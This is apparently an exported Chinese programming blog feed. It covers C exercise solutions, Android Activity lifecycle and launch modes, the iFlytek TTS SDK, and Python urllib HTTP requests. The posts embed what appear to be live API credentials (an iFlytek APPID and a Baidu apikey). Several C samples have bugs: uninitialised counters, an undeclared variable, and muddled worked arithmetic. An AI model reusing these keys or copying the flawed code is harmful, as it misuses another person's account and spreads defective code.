*)malloc(sizeof(int)*(++n)); //动态分配内存 if(n == 1) p[0] = 0; else &#123; p[0] = 0; for(i=1;i&lt;n;i++) p[i] = p[i&amp;(i-1)] + 1; //得到1的个数 &#125; for(i=0;i&lt;n;i++) printf(&quot;%d &quot;,p[i]); //输出数组 printf(&quot;\n&quot;); return 0;&#125; 奇偶校验华科2010年研究生复试机试题 题目描述输入一个字符串，然后对每个字符进行奇校验，最后输出校验后的二进制数(如’3’，输出：10110011)。 输入：输入包括一个字符串，字符串长度不超过100。 输出：可能有多组测试数据，对于每组数据，对于字符串中的每一个字符，输出按题目进行奇偶校验后的数，每个字符校验的结果占一行。 样例输入： 3 3a 样例输出： 10110011 10110011 01100001 思路分析先判断该字符的ASCLL码对应的二进制表示中1的个数是奇数还是偶数，如果是奇数则将该字符的ASCLL码对应的二进制表示的各个位直接输出，如果是偶数则先将最高位或上1，使其中1的个数为奇数个，再将该字符的ASCLL码对应的二进制表示的各个位输出。 C语言实现12345678910111213141516171819202122232425262728293031323334353637383940#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;string.h&gt;int oddCheck(char c) //判断二进制表示中1的个数为奇数个还是偶数个&#123; int count,i; for(i=0;i&lt;7;i++) &#123; if(c&amp;(1&lt;&lt;i)) count++; //计数 &#125; if((count%2) == 0) return 1; else return 0; &#125;int main()&#123; int len,i,j; char a[100]; scanf(&quot;%s&quot;,a); printf(&quot;%d\n&quot;,a[0]); len = strlen(a); for(i=0;i&lt;len;i++) &#123; if(oddCheck(a[i])) a[i] = a[i] | (1&lt;&lt;7); //如果1的个数为偶数个，则将最高位置为1 for(j=7;j&gt;=0;j--) &#123; if(a[i]&amp;(1&lt;&lt;j)) //按顺序输出各个位 printf(&quot;1&quot;); else printf(&quot;0&quot;); &#125; printf(&quot;\n&quot;); &#125; return 0; &#125; 比较奇偶数个数北邮2010年研究生复试机试题 题目描述第一行输入一个数，为n，第二行输入n个数，这n个数中，如果偶数比奇数多，输出NO，否则输出YES。 输入：输入有多组数据。每组输入n，然后输入n个整数（1&lt;=n&lt;=1000）。 输出：如果偶数比奇数多，输出NO，否则输出YES。 样例输入： 5 1 5 2 4 3 样例输出： YES 思路分析通过对2取余来判断这个数是奇数还是偶数，并进行计数，最后比较奇偶计数的大小得到结果进行输出。 C语言实现1234567891011121314151617181920212223242526#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int main()&#123; int even,odd,n,i; int *p; while(scanf(&quot;%d\n&quot;,&amp;n) != EOF) &#123; p = (int *)malloc(sizeof(int)*n); for(i=0;i&lt;n;i++) &#123; scanf(&quot;%d&quot;,&amp;p[i]); if(p[i]%2 == 0) even++; //偶数计数 else odd++; //奇数计数 &#125; if(even &gt; odd) printf(&quot;NO\n&quot;); else printf(&quot;YES\n&quot;); &#125; return 0;&#125;]]></content>
      <categories>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>算法学习</tag>
        <tag>LeetCode</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法学习-刷题(一)]]></title>
    <url>%2F2016%2F08%2F10%2F%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-%E5%88%B7%E9%A2%98-%E4%B8%80%2F</url>
    <content type="text"><![CDATA[在知乎上看到别人分享算法学习之路，确实有很多的经验值得借鉴，其中LeetCode在线判题平台汇集了很多名企的笔试面试算法题，还有牛客网等网站都有不错的算法习题资源，所以打算要坚持刷一刷题。 因为不是纯粹为了刷题而刷题，而是为了学习和练习算法，需要总结，所以就把刷过的题都写进了博客，同时也算是将自己做题的一些过程进行分享。 Sum of Two IntegersLeetCode第371题 题目描述Calculate the sum of two integers a and b, but you are not allowed to use the operator + and -. Example: Given a = 1 and b = 2, return 3. 思路分析12345678910111213141516171819202122232425262728293031323334题目要求不能使用加减号，于是想到使用按位操作来进行解题。先将十进制数转换成二进制数观察规律，综合考虑如下情况：1、没有进位的情况10 + 5 = 15 即二进制的：1111使用异或运算可得到此结果：a = 10; b = 5;转换成二进制为：a = 1010 b = 0101a^b = 11112、有进位的情况20 + 25 = 45 即二进制的：101101使用异或运算:a = 10100 b = 11001a^b = 01101 此结果没有进位要想得到结果，需将a^b的结果与a&amp;b然后左移一位的结果进行异或a&amp;b = 10000 a^b = 01101(a^b)^((a&amp;b)&lt;&lt;1) 即01101^100000 = 101101综合考虑，每次都需判断a&amp;b是否为0，如果不为0则需要将a^b的结果与a&amp;b然后左移一位的结果进行异或，直到a&amp;b的结果为0，即不再有进位时，才输出结果。例如：a = 10 b =10 a+b = 14 即二进制的：11000第一次：a=1010 b=1110 a&amp;b = 1010 不为0a^b = 0100第二次：a = 1010&lt;&lt;1 b = 0100a&amp;b = 00100 不为0a^b = 10000第三次：a = 001000 b = 10000a&amp;b = 00000a^b = 11000 即24 C语言实现12345678910111213141516171819202122232425262728#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int getSum(int a,int b)&#123; int carry,result; carry = a&amp;b; result = a^b; if(carry) &#123; return getSum(carry&lt;&lt;1,result); &#125;else &#123; return result; &#125; return 0;&#125;int main()&#123; int a,b,m; while(scanf(&quot;%d %d&quot;,&amp;a,&amp;b) != EOF) &#123; m = getSum(a,b); printf(&quot;%d\n&quot;,m); &#125; return 0;&#125; 二进制数北邮2012年研究生复试机试题 题目描述大家都知道，数据在计算机里中存储是以二进制的形式存储的。有一天，小明学了C语言之后，他想知道一个类型为unsigned int 类型的数字，存储在计算机中的二进制串是什么样子的。你能帮帮小明吗？并且，小明不想要二进制串中前面的没有意义的0串，即要去掉前导0。 输入： 第一行，一个数字T（T&lt;=1000），表示下面要求的数字的个数。接下来有T行，每行有一个数字n（0&lt;=n&lt;=10^8），表示要求的二进制串。 输出： 输出共T行。每行输出求得的二进制串。 样例输入： 5 23 535 2624 56275 989835 样例输出： 10111 1000010111 101001000000 1101101111010011 11110001101010001011 思路分析12345678910十进制数转二进制，很快就应该想到使用除二取余来解决问题，举个例子来分析一下：11/2 = 5 ---15/2 = 2 ---12/2 = 1 ---01/2 = 0 ---1结果为：1011，分析结果可知，先得到的余数在结果字符串的后面，即先得到的位后输出，后得到的位先输出，这不就是栈的后进先出特点吗？因此，我们使用除二取余的办法将得到的各个余数压入栈中，待除二的结果为0时，再将栈中的各位弹出，即可得到二进制串。 C语言实现：12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;typedef struct&#123; int top; int data[100];&#125;stack;void convert_to_binary(stack *s, unsigned long int d)&#123; s-&gt;top = 0; while (d) &#123; s-&gt;data[s-&gt;top ++] = d % 2; d /= 2; &#125; while (s-&gt;top) &#123; printf(&quot;%d&quot;, s-&gt;data[-- s-&gt;top]); &#125; printf(&quot;\n&quot;);&#125;int main()&#123; int i, n; unsigned long int d; stack *s = (stack *)malloc(sizeof(stack)); while (scanf(&quot;%d&quot;, &amp;n) != EOF) &#123; for (i = 0; i &lt; n; i ++) &#123; scanf(&quot;%ld&quot;, &amp;m); if (m != 0) &#123; convert_to_binary(s, m); &#125;else &#123; printf(&quot;0\n&quot;); &#125; &#125; &#125; return 0;&#125; 字符串连接华科2010年研究生复试机试题 题目描述不借用任何字符串库函数实现无冗余地接受两个字符串，然后把它们无冗余的连接起来。 输入：每一行包括两个字符串，长度不超过100。 输出：可能有多组测试数据，对于每组数据，不借用任何字符串库函数实现无冗余地接受两个字符串，然后把它们无冗余的连接起来。输出连接后的字符串。 样例输入： abc def 样例输出： abcdef 思路分析方案一： 开辟三个字符数组，使用循环遍历数组并将第二个数组的字符复制给第一个数组，再复制第三个数组到第一个数组。 方案一C语言实现123456789101112131415161718192021222324252627#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;void contact(char *str, char *str1, char *str2)&#123; int i,j; for(i=0;str1[i]!=&apos;\0&apos;;i++) &#123; str[i]=str1[i]; &#125; for(j=0;str2[j]!=&apos;\0&apos;;j++) &#123; str[i+j]=str2[j]; &#125; str[i+j]=&apos;\0&apos;;&#125;int main()&#123; char str[202],str1[101],str2[101]; while(scanf(&quot;%s%s&quot;,str1,str2) != EOF) &#123; contact(str, str1, str2); printf(&quot;%s\n&quot;,str); &#125; return 0;&#125; 方案二： 其实呢，这个题是可以取巧的，有没有发现输入是在一行，我们只要把这一行输入直接看成一个字符串，然后把除空格之外的其他字符全部输出不就好了？ 方案二C语言实现12345678910111213141516171819#include&lt;stdio.h&gt;int main()&#123; char a[202]; int i; while(gets(a)!=&apos;\0&apos;) &#123; i=0; while(a[i]!=&apos;\0&apos;) &#123; if(a[i]!=&apos; &apos;) printf(&quot;%c&quot;,a[i]); i++; &#125; printf(&quot;\n&quot;); &#125; return 0;&#125; 另外的思考： 搜这个题目的时候，看到别人提出的问题，确实有些道理啊。由于题目中并没有对”无冗余“的含义做出解释，我们可以把它理解为不占用多余的内存空间来存储输入的字符串。方案一直接定义字符数组，无法实现无冗余，因为数组大小已经固定，但是不一定有那么多字符，因此会造成空间的浪费。就想到用动态内存分配函数malloc和realloc来实现”无冗余“。 malloc：向系统申请分配指定size个字节的内存空间。返回类型是 void* 类型。 realloc：对malloc申请的内存进行大小的调整. 然后，由于上面已经发现了这个题的一个取巧的办法，所以这里将题目格式稍作更改，算是一个改编吧。 样例输入： abc def 样例输出： abcdef C语言实现1234567891011121314151617181920212223242526272829303132333435363738#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int getString(char *str)&#123; int len = 1; char m; while((m = getchar()) != &apos;\n&apos;) &#123; str = (char *)realloc(str,sizeof(char)*len); *(str+len-1) = m; len++; &#125; str = (char *)realloc(str,sizeof(char)*len); *(str+len-1) = &apos;\0&apos;; return len;&#125;int main()&#123; int len1,len2,k; char m,n; char *str1 = (char *)malloc(sizeof(char)); char *str2 = (char *)malloc(sizeof(char)); len1 = getString(str1); len2 = getString(str2); str1 = (char *)realloc(str1,sizeof(char)*(len1+len2-1)); for(k=0;k&lt;len2;k++) &#123; *(str1+len1+k-1) = *(str2+k); &#125; printf(&quot;%s\n&quot;,str1); return 0;&#125;]]></content>
      <categories>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>算法学习</tag>
        <tag>LeetCode</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android Activity生命周期与启动模式]]></title>
    <url>%2F2016%2F08%2F09%2FAndroid-Activity%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E4%B8%8E%E5%90%AF%E5%8A%A8%E6%A8%A1%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[Android 程序的生命周期是由系统控制而非程序自身直接控制，因此了解和管理Activity的生命周期对于Android应用程序开发来说都是十分重要的。本文通过实例演示了Activity的生命周期，并对Android的任务栈设计以及Activity的启动模式进行了介绍。 Activity生命周期官方文档对Activity的生命周期进行了详细的描述，其中，示意图如下： 在Activity的生命周期里会调用以下方法，具体的描述如下表： 方法 描述 onCreat() 当activity启动时调用 onStart() 当activity对用户来说可见时调用 onResume() 当activity将要开始与用户进行交互时调用 onPause() 当系统将要开始恢复以前的activity时调用。 onStop() 当activity不再对用户可见时调用，因为另一个活动已恢复，并覆盖了这一个。 onRestart() 当一个activity被停止后，被重新启动时调用 onDestroy() 当activity被销毁时调用 我们通过重写以上7个方法来观察各个方法的执行情况： MianActivity.java:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566public class MainActivity extends Activity &#123; private Button mButton; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); System.out.println(&quot;MainActivity: onCreate()&quot;); mButton = (Button) findViewById(R.id.btn_to_another); mButton.setOnClickListener(new OnClickListener() &#123; @Override public void onClick(View v) &#123; // TODO Auto-generated method stub Intent intent = new Intent(MainActivity.this,AnotherActivity.class); startActivity(intent); &#125; &#125;); &#125; @Override protected void onStart() &#123; // TODO Auto-generated method stub super.onStart(); System.out.println(&quot;MainActivity: onStart()&quot;); &#125; @Override protected void onResume() &#123; // TODO Auto-generated method stub super.onResume(); System.out.println(&quot;MainActivity: onResume()&quot;); &#125; @Override protected void onPause() &#123; // TODO Auto-generated method stub super.onPause(); System.out.println(&quot;MainActivity: onPause()&quot;); &#125; @Override protected void onRestart() &#123; // TODO Auto-generated method stub super.onRestart(); System.out.println(&quot;MainActivity: onRestart()&quot;); &#125; @Override protected void onStop() &#123; // TODO Auto-generated method stub super.onStop(); System.out.println(&quot;MainActivity: onStop()&quot;); &#125; @Override protected void onDestroy() &#123; // TODO Auto-generated method stub super.onDestroy(); System.out.println(&quot;MainActivity: onDestroy()&quot;); &#125; &#125; AnotherActivity的代码与MainActivity的代码基本相同，在这里就不再贴代码了。 以下是运行程序之后各个情况下的控制台输出： App启动时123MainActivity: onCreat()MainActivity: onStart()MainActivity: onResume() 锁屏或者按下Home键时12MainActivity: onPause()MainActivity: onStop() 解锁或者返回到App时123MainActivity: onRestart()MainActivity: onStart()MainActivity: onResume() 按下Back键时123MainActivity: onPause()MainActivity: onStop()MainActivity: onDestroy() 按下跳转到AnotherActivity按钮时12345MainActivity: onPause()AnotherActivity: onCreat()AnotherActivity: onStart()AnotherActivity: onResume()MainActivity: onStop() 按下跳转到MainActivity按钮时12345AnotherActivity: onPause()MainActivity: onCreat()MainActivity: onStart()MainActivity: onResume()AnotherActivity: onStop() 可以看到，我们在跳转到AnotherActivity时MainActivity并没有被Destroy掉，但是我们按下跳转到MainActivity的按钮时执行了onCeate()方法，即重新创建了一个MainActivity实例，这是为什么呢？其实，这就和Activity的启动模式有关了，请看下文Activity的启动模式。 再按下Back键时123456MainActivity: onPause()AnotherActivity: onRestart()AnotherActivity: onStart()AnotherActivity: onResume()MainActivity: onStop()MainActivity: onDestroy() 注意看，我们在不同的Activity之间切换时，都是先执行的本Activity的onPause()方法，待新的Activity创建启动并显示出来之后，才执行本Activity的onStop()方法，这样的生命周期设计是有他的道理的，首先防止同时显示两个Activity，然后防止另一个Activity启动失败，导致出现黑屏的情况。 Activity四种启动模式Android采用Task来管理多个Activity，任务栈(task stack)，又称为后退栈(back stack)，记录存放用户开启的activity的。在Android操作系统里面会存在多个任务栈，应用程序一被开启系统就给他分配一个任务栈，当所有的Activity都退出的时候，任务栈就清空了，置于栈顶的Activity就是用户看到的Activity。 standard模式默认模式，可以不用写配置。在这个模式下，每次激活Activity都会默认创建一个新的实例。因此，在这种模式下，可以有多个相同的实例，也允许多个相同Activity叠加。 singleTop模式可以有多个实例，但是不允许多个相同Activity叠加。分为两种情况： （1）如果Activity在栈顶的时候，启动相同的Activity，不会创建新的实例，而会调用其onNewIntent方法。 （2）如果Activity不在栈顶的时候，启动Activity时会创建新的实例。 singleTask模式只有一个实例。分为三种情况： （1）如果启动的目标Activity不存在Task栈中,系统将会创建一个目标Activity实例,并将它加入到Task栈顶。 （2）如果启动的目标Activity已存在Task栈顶,此时模式和singleTop模式相同。 （3）若果启动的目标Activity已存在但没有位于Task栈顶,系统将会把该目标Activity上面的所有Activity移除Task栈,使该Activity置于Task栈顶。 singleInstance模式只有一个实例，并且这个实例独立运行在一个task中，这个task只有这个实例，不允许有别的Activity存在。 此启动模式和我们使用的浏览器工作原理类似，我们都知道在多个程序中访问浏览器时，如果当前浏览器没有打开，则打开浏览器，否则会在当前打开的浏览器中访问。此模式会节省大量的系统资源，因为他能保证要请求的Activity对象在当前的栈中只存在一个。 配置启动模式Android Activity的启动方式可以在AndroidManifest.xml文件的activity标签中的android:launchMode属性进行配置： 1234&lt;activity android:name=&quot;com.example.activitydemo.MainActivity&quot; android:label=&quot;@string/app_name&quot; android:launchMode=&quot;standard&quot;&gt;&lt;/activity&gt; 有兴趣的话也可以自己写一个小的Demo来对这四种启动模式进行测试，通过创建几个Activity以及切换按钮，然后在各个Activity的onCreat()方法中写入下面的语句来打印activity实例的标识信息： 1System.out.println(toString()); 通过控制台打印的内容我们可以区分Activity启动时是否创建了新的实例。 通过了解Android Activity的启动模式，我们就可以回答上文中Activity生命周期中留下的问题啦，因为Activity默认配置上启动模式是：standard，因此我们每次启动Activity都会创建新的实例。为Activity选择合适的启动模式可以节省更多的资源，这对于应用程序开发很重要。]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>［Android,Activity］</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android自带TTS与科大讯飞语音SDK]]></title>
    <url>%2F2016%2F08%2F08%2FAndroid%E8%87%AA%E5%B8%A6TTS%E4%B8%8E%E7%A7%91%E5%A4%A7%E8%AE%AF%E9%A3%9E%E8%AF%AD%E9%9F%B3SDK%2F</url>
    <content type="text"><![CDATA[Text-To-Speach简称TTS，指能够将指定的文本转换成不同的语言音频输出的技术。通过TTS技术我们可以为我们的应用添加语音提醒功能，也可以做具备朗读功能的电子词典或者电子书阅读器等，总之，语音合成、语音识别等技术的应用范围还是很广的。本博客主要介绍Android自带的TTS库以及科大讯飞语音SDK的使用。 Android TTS技术Android的TTS可以将文本随意的转换成以下任意五种语言（English、French、German、Italian和Spanish）的语音输出。很可惜，没有中文的，但是也不用担心，后面我们会介绍其他的办法。 先来使用Android系统自带的TTS库，实现起来很简单，示例如下： 1234567891011121314151617181920212223242526272829@Overrideprotected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); mButton = (Button) findViewById(R.id.btn_speak); // 创建TTS对象 mSpeech = new TextToSpeech(MainActivity.this, new OnInitListener() &#123; @Override public void onInit(int status) &#123; // TODO Auto-generated method stub if (status == TextToSpeech.SUCCESS) &#123; mSpeech.setLanguage(Locale.ENGLISH); //设置语言为英语 &#125; &#125; &#125;); //点击按钮说话 mButton.setOnClickListener(new OnClickListener() &#123; @Override public void onClick(View v) &#123; // TODO Auto-generated method stub mSpeech.speak(&quot;Hello World!&quot;, TextToSpeech.QUEUE_FLUSH, null); &#125; &#125;);&#125; 运行程序化后点击按钮你就会听到Hello World！，除此之外还可以设置语速、语调等参数，具体的可以参考官方文档：http://www.android-doc.com/reference/android/speech/tts/package-summary.html 科大讯飞语音SDKAndroid自带的TTS是不支持中文的，但是国内也有很强大的公司在做语音识别，比如众所周知的科大迅飞，它提供了免费的SDK，很多App也都集成了科大讯飞的语音引擎，这里我们也来简单使用一下。 下载科大讯飞Android开发SDK官方地址：http://www.xfyun.cn/ 添加jar包将开发工具包中libs目录下的Msc.jar和armeabi复制到Android工程的libs目录 具体配置步骤可查看开发工具包中doc文件夹下的MSC Develop Manual for Android.pdf文件，里面有详细的介绍。 （1）在工程 AndroidManifest.xml 文件中添加如下权限 文档中还添加了很多其他权限，本博客只介绍了SDK中语音合成功能的使用，如果你需要用到其他的功能那那些权限也是必须要添加的。 123456789101112&lt;!-- 连接网络权限，用于执行云端语音能力 --&gt;&lt;uses-permission android:name=&quot;android.permission.INTERNET&quot; /&gt;&lt;!-- 读取网络信息状态 --&gt;&lt;uses-permission android:name=&quot;android.permission.ACCESS_NETWORK_STATE&quot; /&gt;&lt;!-- 获取当前wifi状态 --&gt;&lt;uses-permission android:name=&quot;android.permission.ACCESS_WIFI_STATE&quot; /&gt;&lt;!-- 允许程序改变网络连接状态 --&gt;&lt;uses-permission android:name=&quot;android.permission.CHANGE_NETWORK_STATE&quot; /&gt;&lt;!-- 外存储读权限，构建语法需要用到此权限 --&gt;&lt;uses-permission android:name=&quot;android.permission.READ_EXTERNAL_STORAGE&quot; /&gt;&lt;!-- 外存储写权限，构建语法需要用到此权限 --&gt;&lt;uses-permission android:name=&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot; /&gt; （2）初始化SDK 1SpeechUtility.createUtility(context, SpeechConstant.APPID + &quot;=你申请的APPID&quot;); （3）语音合成基本配置（摘抄自官方文档） 语音合成是将文字信息转化为可听的声音信息，让机器像人一样开口说话。 123456789101112131415161718192021222324252627282930313233//1.创建 SpeechSynthesizer 对象, 第二个参数：本地合成时传 InitListenerSpeechSynthesizer mTts= SpeechSynthesizer.createSynthesizer(context, null);//2.合成参数设置mTts.setParameter(SpeechConstant.VOICE_NAME, &quot;xiaoyan&quot;); //设置发音人mTts.setParameter(SpeechConstant.SPEED, &quot;50&quot;);//设置语速mTts.setParameter(SpeechConstant.VOLUME, &quot;80&quot;);//设置音量，范围 0~100mTts.setParameter(SpeechConstant.ENGINE_TYPE, SpeechConstant.TYPE_CLOUD); //设置合成音频保存位置（可自定义保存位置） ，保存在“./sdcard/iflytek.pcm”mTts.setParameter(SpeechConstant.TTS_AUDIO_PATH, &quot;./sdcard/iflytek.pcm&quot;);//3.开始合成mTts.startSpeaking(&quot;科大讯飞，让世界聆听我们的声音&quot;, mSynListener);//合成监听器private SynthesizerListener mSynListener = new SynthesizerListener()&#123; //会话结束回调接口，没有错误时，error为null public void onCompleted(SpeechError error) &#123;&#125; //缓冲进度回调 //percent为缓冲进度0~100，beginPos为缓冲音频在文本中开始位置，endPos表示缓冲音频在 文本中结束位置，info为附加信息。 public void onBufferProgress(int percent, int beginPos, int endPos, String info) &#123;&#125; //开始播放 public void onSpeakBegin() &#123;&#125; //暂停播放 public void onSpeakPaused() &#123;&#125; //播放进度回调 //percent为播放进度0~100,beginPos为播放音频在文本中开始位置，endPos表示播放音频在文 本中结束位置. public void onSpeakProgress(int percent, int beginPos, int endPos) &#123;&#125; //恢复播放回调接口 public void onSpeakResumed() &#123;&#125; //会话事件回调接口 public void onEvent(int arg0, int arg1, int arg2, Bundle arg3) &#123;&#125;&#125;; 简单的Demo博主使用科大讯飞SDK的语音合成功能制作了一个简单的Demo，它可以选择不同的发音人来发音，并且可以调节语速和音量。 以下是MainActivity.java的部分代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899@Overrideprotected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); //初始化SDK SpeechUtility.createUtility(this, SpeechConstant.APPID + &quot;=571771fd&quot;); mEditText = (EditText) findViewById(R.id.et_speak); mButton = (Button) findViewById(R.id.btn_speak); mSeekBarVolume = (SeekBar) findViewById(R.id.sb_speak_volume); mSeekBarSpeed = (SeekBar) findViewById(R.id.sb_speak_speed); mSpinner = (Spinner) findViewById(R.id.spinner); // 创建 SpeechSynthesizer 对象, 第二个参数：本地合成时传 InitListener mTts = SpeechSynthesizer.createSynthesizer(this, null); // 合成参数设置 mTts.setParameter(SpeechConstant.VOICE_NAME, &quot;xiaoyan&quot;); // 设置发音人 mTts.setParameter(SpeechConstant.SPEED, &quot;50&quot;);// 设置语速 mTts.setParameter(SpeechConstant.VOLUME, &quot;80&quot;);// 设置音量，范围 0~100 mTts.setParameter(SpeechConstant.ENGINE_TYPE, SpeechConstant.TYPE_CLOUD); // 设置云端 // 设置合成音频保存位置（可自定义保存位置） ，保存在“./sdcard/iflytek.pcm” mTts.setParameter(SpeechConstant.TTS_AUDIO_PATH, &quot;./sdcard/iflytek.wav&quot;); mSeekBarSpeed.setProgress(50); mSeekBarVolume.setProgress(80); mSpinner.setOnItemSelectedListener(new OnItemSelectedListener() &#123; @Override public void onItemSelected(AdapterView&lt;?&gt; arg0, View arg1,int position, long arg3) &#123; // TODO Auto-generated method stub // 设置发音人 mTts.setParameter(SpeechConstant.VOICE_NAME, str[position]); &#125; @Override public void onNothingSelected(AdapterView&lt;?&gt; arg0) &#123; // TODO Auto-generated method stub &#125; &#125;); mSeekBarSpeed.setOnSeekBarChangeListener(new OnSeekBarChangeListener() &#123; @Override public void onStopTrackingTouch(SeekBar seekbar) &#123; // TODO Auto-generated method stub // 设置语速 mTts.setParameter(SpeechConstant.SPEED, seekbar.getProgress()+ &quot;&quot;); &#125; @Override public void onStartTrackingTouch(SeekBar arg0) &#123; // TODO Auto-generated method stub &#125; @Override public void onProgressChanged(SeekBar arg0, int arg1, boolean arg2) &#123; // TODO Auto-generated method stub &#125; &#125;); mSeekBarVolume.setOnSeekBarChangeListener(new OnSeekBarChangeListener() &#123; @Override public void onStopTrackingTouch(SeekBar seekbar) &#123; // TODO Auto-generated method stub // 设置音量，范围 0~100 mTts.setParameter(SpeechConstant.VOLUME,seekbar.getProgress() + &quot;&quot;); &#125; @Override public void onStartTrackingTouch(SeekBar arg0) &#123; // TODO Auto-generated method stub &#125; @Override public void onProgressChanged(SeekBar arg0, int arg1, boolean arg2) &#123; // TODO Auto-generated method stub &#125; &#125;); mButton.setOnClickListener(new OnClickListener() &#123; @Override public void onClick(View arg0) &#123; // TODO Auto-generated method stub String text = mEditText.getText().toString(); // 开始合成 mTts.startSpeaking(text, mSynListener); &#125; &#125;);&#125; 至此，我们就可以为我们的应用添加语音合成功能啦，是不是很方便？其实，除此之外，科大讯飞的SDK还具备语音识别、声纹密码、人脸识别等多种功能，具体的操作方法请参考下载的SDK工具包中的中文文档资料。]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>［Android,TTS］</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python Http网络请求]]></title>
    <url>%2F2016%2F08%2F07%2FPython-Http%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82%2F</url>
    <content type="text"><![CDATA[Python网络爬虫开发离不开Http网络请求，此前的几篇Python网络爬虫博客中，对网络爬虫已经有了一些基本的介绍，也使用了一些网络请求库，但是没有对Python网络请求做详细的说明，此篇博客将对Python的Http网络请求进行一个总结，通过列举不同的Http请求库的不同请求写法来熟悉Python的网络请求，从而有利于后续的网络爬虫开发。 注：博主的Python环境为Python2.7.5，使用Python3的读者要注意个别的类库与Python2有很大区别。 urllib与urllib2模块urllib与urllib2比较urllib与urllib2是python自带的库，不需要额外导入，但是很多人可能会比较困惑这两个库有什么区别呢？很多人认为urllib2是urllib的升级版，我之前也是这么认为的，但是这是不对的。 urllib 和urllib2都是接受URL请求的相关模块，但是他们是不可相互替代的，因为提供了不同的功能。整体来说，urllib2是urllib的增强，但是urllib中有urllib2中所没有的函数。他们两个最显著的不同如下： urllib2可以接受一个Request类的实例来设置URL请求的Headers，urllib仅可以接受URL。这意味着，你不可以伪装你的User Agent字符串等。如果你访问一个网站，想更改User Agent（可以伪装你的浏览器），你就要用urllib2。 urllib支持设置编码的函数，urllib.urlencode，在模拟登陆的时候，经常要post编码之后的参数，所以要想不使用第三方库完成模拟登录，你就需要使用urllib。也正因为如此，urllib常和urllib2一起使用。 urllib模块urlopen()函数的使用urlopen(url, data=None, proxies=None) 参数url：表示远程数据的路径，一般是http或者ftp路径。 可选参数data：表示以post方式提交到url的数据。 可选参数proxies：表示用于代理的设置。 urlopen返回一个类文件对象，它提供了如下方法： read() , readline() , readlines()，fileno()和close()：这些函数的使用与文件对象完全一样。 info()：返回一个httplib.HTTPMessage 对象，表示远程服务器返回的头信息。 getcode()：返回Http状态码，如果是http请求，200表示请求成功完成;404表示网址未找到。 geturl()：返回请求的url地址。 简单GET请求此处代码中的GET请求都是对博主博客的一个404页面发送的请求，会返回服务器响应信息以及网页源代码。 123456789# -*- coding:utf-8 -*-import urllibres = urllib.urlopen(&quot;http://blog.line-coding.tech/&quot;)print res.info()print res.getcode()print res.geturl()print res.read() 123456789101112131415运行结果如下：Date: Sat, 06 Aug 2016 13:48:53 GMTServer: Apache/2.4.6 (CentOS) mod_wsgi/4.5.3 Python/2.7.5 PHP/5.4.16Last-Modified: Thu, 14 Jul 2016 06:29:45 GMTETag: &quot;4f3-53792a0bfd6ca&quot;Accept-Ranges: bytesContent-Length: 1267Connection: closeContent-Type: text/html; charset=UTF-8200http://blog.line-coding.tech/篇幅有限，此处省略了请求页面的html文档。 简单POST请求此处代码的POST请求都是对博主服务器上的一个用户注册API接口发送的请求，其中请求参数包括用户名和密码，如果服务器中的数据库已经存在此账号则会返回一个exist，如果注册成功则会返回一个success，请求错误则返回一个go away。 123456789# -*- coding:utf-8 -*-import urlliburl = &apos;http://data.line-coding.tech/register.php&apos;data = &#123;&apos;username&apos;:&apos;13654852343&apos;,&apos;password&apos;:&apos;123456&apos;&#125;res = urllib.urlopen(url, data = urllib.urlencode(data))print res.info()print res.getcode()print res.geturl()print res.read() 123运行结果如下：篇幅有限，此处只写出服务器返回的内容exist urllib2模块urllib2用一个Request对象来映射你提出的HTTP请求,在它最简单的使用形式中你将用你要请求的地址创建一个Request对象，通过调用urlopen并传入Request对象，将返回一个相关请求response对象，这个应答对象如同一个文件对象，所以你同样可以像在使用urllib模块时调用info()、getcode()、geturl()、read()等函数。 简单GET请求12345678# -*- coding:utf-8 -*-import urllib2res = urllib2.urlopen(&quot;http://blog.line-coding.tech/&quot;)print res.info()print res.getcode()print res.geturl()print res.read() 1运行结果同urllib的GET方法 说明： 下文中使用到百度APIStore中一个既可以接收GET请求又可以接收POST请求的查询学校信息的API接口，该接口的使用方法可参考 相关文档（http://apistore.baidu.com/apiworks/servicedetail/2843.html），简单说来，使用它时需要传递一个学校名字的参数，以及添加自己的百度API Store的API-key。由于它既可以接收GET请求又可以接收POST请求，所以下文的示例代码中会得到很多同样的结果，但是采用GET方法时参数是连接在在url后面的，而POST方法则不是，请大家注意区分。 带Header的POST请求12345678910# -*- coding:utf-8 -*-import urllib,urllib2from urllib import urlencodeurl = &apos;http://apis.baidu.com/jidichong/school_search/school_search&apos;data = &#123;&apos;name&apos;:&apos;清华大学&apos;&#125;req = urllib2.Request(url, urlencode(data))req.add_header(&quot;apikey&quot;, &quot;c57bc70b78d5926e8cfbb3ad9c195465&quot;) #此处添加自己的百度API Stroe的APIKEYresp = urllib2.urlopen(req)print resp.read() 